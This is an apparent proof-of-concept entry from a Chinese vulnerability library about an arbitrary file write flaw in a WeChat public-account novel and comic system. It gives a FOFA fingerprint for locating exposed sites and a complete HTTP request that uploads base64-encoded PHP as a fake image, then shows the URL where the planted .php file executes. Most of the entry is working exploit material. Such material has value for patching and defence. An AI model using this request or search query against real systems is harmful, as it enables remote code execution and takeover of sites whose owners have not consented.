---
fofa: "/Public/home/mhjs/jquery.js"
source: "wy876 漏洞文库"
---

# 微信公众号小说漫画系统Upload存在任意文件写入漏洞

# 一、漏洞简介
微信公众号小说漫画系统前台任意文件写入漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

# 二、影响版本
+ 微信公众号小说漫画系统

# 三、资产测绘
+ fofa`"/Public/home/mhjs/jquery.js"`
+ 特征


# 四、漏洞复现
```java
POST /index.php?m=&c=IndexAjax&a=Upload HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 78
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=bf13e78oe1uqp8nh3crld1gu55; uloginid=107639
Host: 
Origin: http://xxx
Pragma: no-cache
Referer: http://xx/index.php?m=&c=IndexAjax
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

img=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg==&size=50
```


```java
https://xxx/Upload/20241008/104249_499.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gzk5f87zuin8ipgr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
